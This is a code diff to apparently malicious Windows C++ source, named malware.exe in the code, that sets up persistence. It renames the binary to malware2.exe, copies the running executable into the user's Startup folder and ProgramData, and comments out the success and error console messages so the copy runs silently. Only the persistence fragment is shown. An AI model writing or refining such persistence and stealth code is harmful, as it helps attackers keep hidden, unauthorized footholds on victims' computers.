@@ -54,8 +54,8 @@ bool checkAutoStartEnabled(LPCTSTR appName) {
 
 // Main function for setting up persistence. 
 int setupPersistence() {
-    LPCTSTR appAlias = _T("malware.exe");
-    LPCTSTR appExecutablePath = _T("C:\\ProgramData\\malware.exe");
+    LPCTSTR appAlias = _T("malware2.exe");
+    LPCTSTR appExecutablePath = _T("C:\\ProgramData\\malware2.exe");
 
     if (checkAutoStartEnabled(appAlias)) {
         _tprintf(_T("Auto-start already configured for %s.!!\n"), appAlias);
@@ -77,18 +77,18 @@ bool copyToStartupFolder() {
 
     // Get the path to the user's Startup folder
     if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
-        std::wstring destinationPath = std::wstring(startupPath) + L"\\malware.exe";
+        std::wstring destinationPath = std::wstring(startupPath) + L"\\malware2.exe";
 
         // Copy the file to the Startup folder
         if (CopyFileW(currentPath, destinationPath.c_str(), FALSE)) {
-            std::wcout << L"[SUCCESS] File copied to: " << destinationPath << std::endl;
+            // std::wcout << L"[SUCCESS] File copied to: " << destinationPath << std::endl;
             return true;
         } else {
-            std::cerr << "[ERROR] Failed to copy file. Error code: " << GetLastError() << std::endl;
+            // std::cerr << "[ERROR] Failed to copy file. Error code: " << GetLastError() << std::endl;
             return false;
         }
     } else {
-        std::cerr << "[ERROR] Failed to get Startup folder path." << std::endl;
+        // std::cerr << "[ERROR] Failed to get Startup folder path." << std::endl;
         return false;
     }
 }
